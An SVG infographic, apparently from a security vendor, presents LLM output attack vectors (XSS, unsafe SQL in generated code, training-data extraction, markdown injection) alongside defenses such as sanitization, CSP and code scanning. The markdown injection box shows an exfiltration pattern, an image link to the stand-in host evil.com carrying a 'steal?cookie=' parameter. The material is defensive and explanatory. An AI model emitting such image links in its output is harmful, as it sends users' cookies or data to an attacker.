<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 480" font-family="system-ui,-apple-system,sans-serif">
  <defs>
    <linearGradient id="bg4" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#0f172a"/>
      <stop offset="100%" style="stop-color:#1e293b"/>
    </linearGradient>
    <filter id="sh4"><feDropShadow dx="0" dy="2" stdDeviation="4" flood-opacity="0.3"/></filter>
  </defs>

  <rect width="900" height="480" fill="url(#bg4)" rx="12"/>
  <text x="450" y="38" text-anchor="middle" fill="#f8fafc" font-size="20" font-weight="700">LLM Output Security — Attack Vectors &amp; Defenses</text>

  <!-- Attack Vectors -->
  <text x="225" y="72" text-anchor="middle" fill="#fca5a5" font-size="16" font-weight="700">⚡ Output Attack Vectors</text>

  <!-- XSS via LLM -->
  <rect x="20" y="90" width="200" height="100" rx="8" fill="#1e1e2e" stroke="#dc2626" stroke-width="1.5" filter="url(#sh4)"/>
  <text x="120" y="113" text-anchor="middle" fill="#f87171" font-size="12" font-weight="600">XSS via LLM Output</text>
  <text x="120" y="133" text-anchor="middle" fill="#94a3b8" font-size="9">LLM generates &lt;script&gt; tags</text>
  <text x="120" y="148" text-anchor="middle" fill="#94a3b8" font-size="9">rendered in browser without</text>
  <text x="120" y="163" text-anchor="middle" fill="#94a3b8" font-size="9">sanitization → session hijack</text>
  <text x="120" y="180" text-anchor="middle" fill="#fca5a5" font-size="9" font-weight="600">CVSS: 8.1 (High)</text>

  <!-- SQL Injection -->
  <rect x="230" y="90" width="200" height="100" rx="8" fill="#1e1e2e" stroke="#dc2626" stroke-width="1.5" filter="url(#sh4)"/>
  <text x="330" y="113" text-anchor="middle" fill="#f87171" font-size="12" font-weight="600">SQL via AI Code Gen</text>
  <text x="330" y="133" text-anchor="middle" fill="#94a3b8" font-size="9">Copilot/AI generates queries</text>
  <text x="330" y="148" text-anchor="middle" fill="#94a3b8" font-size="9">with string concatenation</text>
  <text x="330" y="163" text-anchor="middle" fill="#94a3b8" font-size="9">instead of parameterized queries</text>
  <text x="330" y="180" text-anchor="middle" fill="#fca5a5" font-size="9" font-weight="600">CVSS: 9.8 (Critical)</text>

  <!-- Data Leakage -->
  <rect x="20" y="200" width="200" height="100" rx="8" fill="#1e1e2e" stroke="#f59e0b" stroke-width="1.5" filter="url(#sh4)"/>
  <text x="120" y="223" text-anchor="middle" fill="#fbbf24" font-size="12" font-weight="600">Training Data Leakage</text>
  <text x="120" y="243" text-anchor="middle" fill="#94a3b8" font-size="9">Extracting PII, API keys,</text>
  <text x="120" y="258" text-anchor="middle" fill="#94a3b8" font-size="9">passwords from model memory</text>
  <text x="120" y="273" text-anchor="middle" fill="#94a3b8" font-size="9">via targeted prompts</text>
  <text x="120" y="290" text-anchor="middle" fill="#fde68a" font-size="9" font-weight="600">CVSS: 7.5 (High)</text>

  <!-- Markdown Injection -->
  <rect x="230" y="200" width="200" height="100" rx="8" fill="#1e1e2e" stroke="#f59e0b" stroke-width="1.5" filter="url(#sh4)"/>
  <text x="330" y="223" text-anchor="middle" fill="#fbbf24" font-size="12" font-weight="600">Markdown Injection</text>
  <text x="330" y="243" text-anchor="middle" fill="#94a3b8" font-size="9">LLM outputs ![img](evil.com/</text>
  <text x="330" y="258" text-anchor="middle" fill="#94a3b8" font-size="9">steal?cookie=...) in markdown</text>
  <text x="330" y="273" text-anchor="middle" fill="#94a3b8" font-size="9">rendered as image → exfiltration</text>
  <text x="330" y="290" text-anchor="middle" fill="#fde68a" font-size="9" font-weight="600">CVSS: 6.5 (Medium)</text>

  <!-- Defense Strategies -->
  <text x="675" y="72" text-anchor="middle" fill="#4ade80" font-size="16" font-weight="700">🛡️ Defense Strategies</text>

  <rect x="470" y="90" width="410" height="65" rx="8" fill="#1e1e2e" stroke="#22c55e" stroke-width="1.5" filter="url(#sh4)"/>
  <text x="675" y="113" text-anchor="middle" fill="#4ade80" font-size="12" font-weight="600">1. Output Encoding — Always sanitize LLM output</text>
  <text x="675" y="133" text-anchor="middle" fill="#94a3b8" font-size="10">DOMPurify for HTML, parameterized queries for SQL, escape shell args</text>
  <text x="675" y="148" text-anchor="middle" fill="#94a3b8" font-size="9">Never trust LLM output as safe — treat it like user input</text>

  <rect x="470" y="165" width="410" height="55" rx="8" fill="#1e1e2e" stroke="#22c55e" stroke-width="1.5" filter="url(#sh4)"/>
  <text x="675" y="188" text-anchor="middle" fill="#4ade80" font-size="12" font-weight="600">2. Content Security Policy (CSP) Headers</text>
  <text x="675" y="205" text-anchor="middle" fill="#94a3b8" font-size="10">Strict CSP blocks inline scripts even if LLM outputs them</text>

  <rect x="470" y="230" width="410" height="55" rx="8" fill="#1e1e2e" stroke="#22c55e" stroke-width="1.5" filter="url(#sh4)"/>
  <text x="675" y="253" text-anchor="middle" fill="#4ade80" font-size="12" font-weight="600">3. Structured Output Schemas (JSON mode)</text>
  <text x="675" y="270" text-anchor="middle" fill="#94a3b8" font-size="10">Force LLM to return validated JSON, not free-form text</text>

  <rect x="470" y="295" width="410" height="55" rx="8" fill="#1e1e2e" stroke="#22c55e" stroke-width="1.5" filter="url(#sh4)"/>
  <text x="675" y="318" text-anchor="middle" fill="#4ade80" font-size="12" font-weight="600">4. Code Review Scanning (SAST for AI-generated code)</text>
  <text x="675" y="335" text-anchor="middle" fill="#94a3b8" font-size="10">Run ShieldX SAST on all AI-generated code before deployment</text>

  <!-- Stats -->
  <rect x="20" y="340" width="410" height="60" rx="8" fill="#1e1e2e" stroke="#334155" stroke-width="1"/>
  <text x="70" y="365" text-anchor="middle" fill="#f87171" font-size="18" font-weight="700">40%</text>
  <text x="70" y="383" text-anchor="middle" fill="#94a3b8" font-size="9">AI-generated code</text>
  <text x="70" y="394" text-anchor="middle" fill="#94a3b8" font-size="8">has vulnerabilities</text>
  <text x="175" y="365" text-anchor="middle" fill="#fbbf24" font-size="18" font-weight="700">3.6×</text>
  <text x="175" y="383" text-anchor="middle" fill="#94a3b8" font-size="9">More likely to</text>
  <text x="175" y="394" text-anchor="middle" fill="#94a3b8" font-size="8">contain CWE-79 (XSS)</text>
  <text x="290" y="365" text-anchor="middle" fill="#f87171" font-size="18" font-weight="700">25%</text>
  <text x="290" y="383" text-anchor="middle" fill="#94a3b8" font-size="9">of Copilot suggestions</text>
  <text x="290" y="394" text-anchor="middle" fill="#94a3b8" font-size="8">fail OWASP checks</text>
  <text x="393" y="365" text-anchor="middle" fill="#4ade80" font-size="18" font-weight="700">94%</text>
  <text x="393" y="383" text-anchor="middle" fill="#94a3b8" font-size="9">caught by automated</text>
  <text x="393" y="394" text-anchor="middle" fill="#94a3b8" font-size="8">SAST scanning</text>

  <!-- Golden Rule -->
  <rect x="20" y="415" width="860" height="35" rx="8" fill="#1e1e2e" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="450" y="437" text-anchor="middle" fill="#fde68a" font-size="13" font-weight="700">⚡ Golden Rule: Treat ALL LLM output with the same distrust as untrusted user input ⚡</text>

  <text x="450" y="470" text-anchor="middle" fill="#475569" font-size="10">securecodereviews.com/shieldx — Sources: Stanford AI Security Lab, GitHub Copilot Study 2024, OWASP LLM Top 10</text>
</svg>